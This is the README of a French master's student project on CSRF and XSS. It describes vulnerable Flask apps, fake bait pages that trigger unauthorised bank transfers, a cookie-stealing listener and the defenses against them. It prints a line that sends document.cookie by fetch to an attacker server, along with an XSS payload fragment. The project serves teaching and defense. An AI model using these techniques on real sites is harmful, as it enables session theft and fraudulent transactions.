# 🛡️ Projet Académique : Sécurité Web Applicative (OWASP)
## Démonstrations Pratiques & Contre-Mesures : CSRF & XSS

**Auteur :** Ayoub  
**Formation :** Master 2 Ingénierie Informatique (M2I) - Semestre 3  
**Module :** Module 4 - Cybersécurité CEH (*Certified Ethical Hacker*)  
**Environnement :** Python 3.10+, Flask, Vanilla JavaScript, Unittest  

---

> [!IMPORTANT]
> **Avertissement Éthique & Légal**  
> L'ensemble du code source, des scripts d'exploitation et des démonstrations contenus dans cet espace de travail a été conçu à des **fins strictement pédagogiques et éducatives**. Les tests s'effectuent exclusivement en local (`127.0.0.1` / `localhost`) ou sur un réseau local privé autorisé (`LAN`). Tout usage malveillant sur des systèmes tiers sans consentement écrit préalable est formellement illégal (Articles 323-1 et suivants du Code Pénal).

---

## 1. Vue d'Ensemble du Projet

Ce projet constitue une plateforme complète d'apprentissage et de démonstration technique sur deux des vulnérabilités les plus emblématiques du **Top 10 OWASP** :
1. **La falsification de requête intersites (CSRF - *Cross-Site Request Forgery*)** :
   - Étude mono-machine (`127.0.0.1` vs `localhost`).
   - Étude distribuée multi-machines sur réseau local Wi-Fi / Ethernet (`LAN`).
   - Démonstration de multiples vecteurs d'exploitation : méthode `GET`, formulaire `POST`, et balises multimédias `<img src="...">`.
2. **L'injection de code indirecte (XSS - *Cross-Site Scripting*)** :
   - XSS Réfléchi (*Reflected XSS*) via des paramètres de recherche HTTP `GET`.
   - XSS Stocké (*Stored XSS*) persistant en base/mémoire via un livre d'or.
   - Exfiltration en direct de cookies de session vers un serveur pirate d'écoute C2 (*Command & Control*).
3. **L'interaction critique CSRF ↔ XSS** :
   - Démonstration de la rupture du jeton anti-CSRF en présence d'une faille XSS.
   - Application concrète du principe de **Défense en Profondeur**.

Tous les modules respectent des standards industriels : **zéro dépendance externe lourde** (stockage transparent en mémoire vive), **reproductibilité garantie**, **scripts universels Windows (`run_demo.bat`)**, et **suites de tests unitaires automatisées (100% de réussite)**.

---

## 2. Cartographie de l'Espace de Travail

Le répertoire racine `Exposé - CSRF & XSS/` est structuré en 4 pôles distincts :

```text
Exposé - CSRF & XSS/
│
├── 📁 csrf-tp/                     # PÔLE 1 : CSRF Fondamental (Mono-Machine)
│   ├── vulnerable/app.py           # Application bancaire vulnérable (Port 5000)
│   ├── secure_token/app_secure.py  # Défense par Synchronizer Token Pattern (Port 5000)
│   ├── secure_samesite/app_samesite.py # Défense par cookie SameSite=Strict & HttpOnly
│   ├── attacker/piege.html         # Page piège leurre (Faux cadeau de 200 € sur Port 8081)
│   ├── tests/test_csrf.py          # Suite de tests d'intégration (4/4 tests validés)
│   ├── run_demo.bat                # Lanceur universel Windows (vulnerable | token | samesite)
│   ├── PIPELINE_DEMO.txt           # Fiche de passage oral détaillée
│   └── README.md                   # Documentation technique du TP 1
│
├── 📁 csrf-tp-lan/                 # PÔLE 2 : CSRF Distribué (Multi-Machines Réseau Local)
│   ├── vulnerable/app.py           # Serveur Flask écoutant sur 0.0.0.0 (Port 5000)
│   ├── secure_token/app_secure.py  # Version sécurisée par Token en réseau LAN
│   ├── secure_samesite/app_samesite.py # Version sécurisée par SameSite en réseau LAN
│   ├── attacker/piege.html         # Piège avec ciblage dynamique d'IP de la victime
│   ├── tests/test_lan_csrf.py      # Tests automatisés sur l'interface réseau (4/4 tests validés)
│   ├── run_server_victim.bat       # Script à lancer sur la Machine A (Victime)
│   ├── run_attacker.bat            # Script à lancer sur la Machine B (Attaquant)
│   └── README.md                   # Guide d'interconnexion réseau LAN
│
├── 📁 csrf-tp-lan-2/               # PÔLE 3 : CSRF Multi-Scénarios Métiers (Séance de Cours)
│   ├── 📁 1_scenario_get_recrutement/
│   │   ├── app.py                  # Banque vulnérable avec mutation en GET (Port 5000)
│   │   ├── app_secure.py           # Version sécurisée (Interdiction du GET + Token CSRF)
│   │   ├── attacker/stage_recrutement.html # Fausse offre de stage PFE cyber (NexaSec - 1 650 €/mois)
│   │   └── run_demo.bat            # Lanceur rapide du Scénario 1
│   │
│   ├── 📁 3_scenario_img_forum/
│   │   ├── app.py                  # Portefeuille de micro-débits vulnérable (Port 5000)
│   │   ├── app_secure.py           # Version sécurisée (POST obligatoire + Jeton)
│   │   ├── attacker/forum_photo.html # Galerie photos Pinterest (PhotoSphere - Clic ou balise <img>)
│   │   └── run_demo.bat            # Lanceur rapide du Scénario 2 (Images)
│   │
│   ├── PIPELINE_DEMO.txt           # Déroulé oral pas à pas pour la séance de cours
│   └── README.md                   # Guide de référence des 2 scénarios métiers
│
└── 📁 xss-tp/                      # PÔLE 4 : Failles XSS & Vol de Session C2
    ├── vulnerable/app.py           # Faille Réfléchie (/search) & Faille Stockée (/guestbook)
    ├── secure/app_secure.py        # Défenses : Échappement HTML + Cookie HttpOnly + Header CSP
    ├── attacker/logger_server.py   # Serveur pirate C2 recevant les cookies volés (Port 8888)
    ├── tests/test_xss.py           # Suite de tests d'injection XSS (5/5 tests validés)
    ├── run_demo.bat                # Lanceur universel Windows (vulnerable | secure)
    ├── PIPELINE_DEMO.txt           # Fiche mémo des payloads à injecter en direct
    └── README.md                   # Guide approfondi sur le XSS et la Content Security Policy
```

---

## 3. Synthèse Technique Approfondie des Vulnérabilités

### A. L'Attaque CSRF (Cross-Site Request Forgery)
* **Mécanisme fondamental** : Le navigateur attache **automatiquement** les cookies de session enregistrés à toute requête HTTP sortante dirigée vers le domaine cible, peu importe l'origine à l'initiative de la requête.
* **Le rôle de la SOP (Same-Origin Policy)** : La SOP est une politique de **lecture** et non d'écriture. Un script hébergé sur `127.0.0.1:8081` ne peut pas lire le contenu de la page bancaire de `127.0.0.1:5000`, mais le navigateur l'autorise à envoyer un formulaire ou une requête `GET` modifiant les données côté serveur.
* **Les 2 Défenses fondamentales** :
  1. **Synchronizer Token Pattern** : Jeton cryptographiquement sécurisé (`secrets.token_hex(32)`) associé à la session utilisateur et injecté dans chaque formulaire légitime. Le pirate ne pouvant ni le deviner ni le lire (grâce à la SOP), toute requête forgée échoue avec un code **`403 Forbidden`**.
  2. **Attribut de Cookie `SameSite=Strict`** : Le navigateur refuse d'expédier le cookie de session dès que la requête provient d'un autre site, neutralisant l'attaque avec un code **`401 Unauthorized`**.

### B. L'Attaque XSS (Cross-Site Scripting)
* **Mécanisme fondamental** : L'attaquant injecte du code JavaScript malveillant dans l'application cible. Ce code est ensuite réémis par le serveur et interprété par le navigateur de la victime au sein du **contexte d'origine légitime** du site.
* **Variantes démontrées** :
  - **XSS Réfléchi (*Reflected*)** : Le payload est injecté dans un paramètre d'URL (ex: `/search?q=<script>...`) et immédiatement renvoyé sans assainissement.
  - **XSS Stocké (*Stored / Persistant*)** : Le payload est enregistré durablement en base ou en mémoire (ex: livre d'or `/guestbook`) et infecte **chaque utilisateur** qui visite la page.
* **Exfiltration de Cookie C2** : Démonstration du vol de `document.cookie` via `fetch('http://127.0.0.1:8888/?cookie=' + ...)` vers la console du pirate.
* **Les Défenses appliquées** :
  1. **Échappement contextuel (Entity Encoding)** : Les balises `<script>` sont converties en `&lt;script&gt;` inoffensives.
  2. **Drapeau de cookie `HttpOnly=True`** : Interdit formellement à JavaScript d'accéder au cookie de session via `document.cookie`.
  3. **Content Security Policy (CSP)** : En-tête HTTP (`default-src 'self'`) interdisant l'exécution de scripts inline ou vers des domaines tiers non autorisés.

---

## 4. Matrice Comparative : CSRF vs XSS

| Critère d'Analyse | CSRF (*Cross-Site Request Forgery*) | XSS (*Cross-Site Scripting*) |
| :--- | :--- | :--- |
| **Origine de la vulnérabilité** | Confiance aveugle du serveur dans le navigateur de la victime. | Confiance aveugle du navigateur dans les données renvoyées par le serveur. |
| **Lieu d'exécution** | **Sur le serveur cible** (qui traite l'ordre transmis par le navigateur). | **Dans le navigateur client** (qui interprète le JavaScript injecté). |
| **Capacité de lecture des données** | **Aucune** (La SOP bloque la lecture de la réponse par le site attaquant). | **Totale** (Le script tourne dans l'origine et le DOM de la cible). |
| **Besoins de l'attaquant** | Une victime connectée + un prétexte de clic / visite (Phishing). | Un champ de saisie non assaini ou une URL réfléchie non échappée. |
| **Conséquences types** | Virement bancaire, changement d'email, modification d'adresse. | Vol de session, défiguration de site, keylogger, bypass de token CSRF. |
| **Contre-mesures de référence** | **Jeton anti-CSRF** + Cookie `SameSite=Strict/Lax`. | **Échappement HTML** + Cookie `HttpOnly` + En-tête **CSP**. |

> [!CAUTION]
> **Le Lien Fatal entre XSS et CSRF (Défense en Profondeur) :**  
> Une protection anti-CSRF par jeton devient **totalement inefficace** si le site présente une vulnérabilité XSS. Le script malveillant injecté sur le domaine légitime a le droit de lire le DOM, de subtiliser le jeton CSRF et de soumettre la requête en toute légitimité. Sécuriser contre le CSRF impose donc d'éradiquer au préalable tout risque XSS.

---

## 5. Guide d'Exécution Rapide (Pour la Soutenance Orale)

### Pôle 1 : Démonstration CSRF Fondamentale (`csrf-tp`)
```cmd
cd "csrf-tp"

# Scénario Vulnérable (Victime http://127.0.0.1:5000 | Piège http://127.0.0.1:8081/piege.html)
.\run_demo.bat vulnerable

# Défense par Synchronizer Token (Rejet 403 Forbidden)
.\run_demo.bat token

# Défense par Cookie SameSite=Strict (Rejet 401 Unauthorized)
.\run_demo.bat samesite

# Lancer la suite de tests automatisés (4/4 tests validés)
python tests/test_csrf.py
```

### Pôle 2 : Démonstration CSRF Réseau Local (`csrf-tp-lan`)
```cmd
cd "csrf-tp-lan"

# Sur le PC Victime (Machine A) :
.\run_server_victim.bat vulnerable

# Sur le PC Attaquant (Machine B) :
.\run_attacker.bat

# Validation automatisée sur l'adresse IP réseau locale réelle :
python tests/test_lan_csrf.py
```

### Pôle 3 : Scénarios Métiers pour la Séance de Cours (`csrf-tp-lan-2`)
```cmd
# 1. Scénario GET (Offre de stage PFE NexaSec à 1 650 €/mois) :
cd "csrf-tp-lan-2\1_scenario_get_recrutement"
.\run_demo.bat vulnerable   # Virement de 500 € déclenché en GET au clic ou auto
.\run_demo.bat secure       # Protection par rejet du GET & Token CSRF

# 2. Scénario Image (Galerie Pinterest PhotoSphere) :
cd "..\3_scenario_img_forum"
.\run_demo.bat vulnerable   # Débit de 200 € au clic sur n'importe quelle photo
.\run_demo.bat secure       # Protection par obligation du POST + Jeton
```

### Pôle 4 : Démonstration XSS & Vol de Session (`xss-tp`)
```cmd
cd "xss-tp"

# Lancer l'application cible (Port 5000) et le serveur pirate C2 (Port 8888) :
.\run_demo.bat vulnerable

# Démontrer les défenses (Échappement, HttpOnly, Content-Security-Policy) :
.\run_demo.bat secure

# Lancer la suite de tests automatisés (5/5 tests validés) :
python tests/test_xss.py
```

---

## 6. Bilan des Tests Automatisés (Qualité & Non-Régression)

L'ensemble des modules applicatifs a été validé programmatiquement avec **13/13 tests réussis (100% de succès)** :

```text
================================================================================
 SUITE 1 : csrf-tp/tests/test_csrf.py
--------------------------------------------------------------------------------
 [OK] test_01_vulnerable_app_csrf_succeeds          (Attaque réussie, email altéré)
 [OK] test_02_secure_token_blocks_forged_request    (Requête forgée rejetée 403)
 [OK] test_03_secure_token_legitimate_succeeds      (Formulaire légitime accepté 200)
 [OK] test_04_secure_samesite_attribute_configured  (En-têtes SameSite & Rejet 401)
 Résultat : 4/4 PASSÉ en 3.34s

================================================================================
 SUITE 2 : csrf-tp-lan/tests/test_lan_csrf.py
--------------------------------------------------------------------------------
 [OK] test_01_lan_vulnerable_app_receptive         (Validation sur IP réseau réelle)
 [OK] test_02_lan_secure_token_blocks              (Rejet 403 Forbidden)
 [OK] test_03_lan_secure_token_legit_works         (Validation avec jeton LAN)
 [OK] test_04_lan_samesite_configured             (Rejet 401 Unauthorized)
 Résultat : 4/4 PASSÉ en 6.27s

================================================================================
 SUITE 3 : xss-tp/tests/test_xss.py
--------------------------------------------------------------------------------
 [OK] test_01_reflected_xss_is_injected_raw         (Balise <script> réémise brute)
 [OK] test_02_stored_xss_persists_in_guestbook     (Persistance du script malveillant)
 [OK] test_03_vulnerable_cookie_missing_httponly   (Flag HttpOnly absent, vol possible)
 [OK] test_04_secure_app_escapes_xss_payloads      (Encodage entités &lt;script&gt;)
 [OK] test_05_secure_app_enforces_httponly_and_csp (Flags HttpOnly et CSP actifs)
 Résultat : 5/5 PASSÉ en 3.30s
================================================================================
 TOTAL : 13/13 TESTS AUTOMATISÉS CONFORMES
```

---

## 7. Références Officielles & Bibliographie

* **OWASP Top 10:2021** :
  - *A01:2021 – Broken Access Control* (Catégorie couvrant le CSRF).
  - *A03:2021 – Injection* (Catégorie couvrant le XSS).
* **RFC 6265bis** : *Cookies: HTTP State Management Mechanism* (Spécification officielle des attributs `SameSite=Strict/Lax/None` et `HttpOnly`).
* **RFC 7231** : *Hypertext Transfer Protocol (HTTP/1.1): Semantics and Content* (Principe d'idempotence et d'innocuité des méthodes HTTP `GET`).
* **W3C Content Security Policy Level 3** : Recommandations pour la mitigation des injections de scripts côté client.
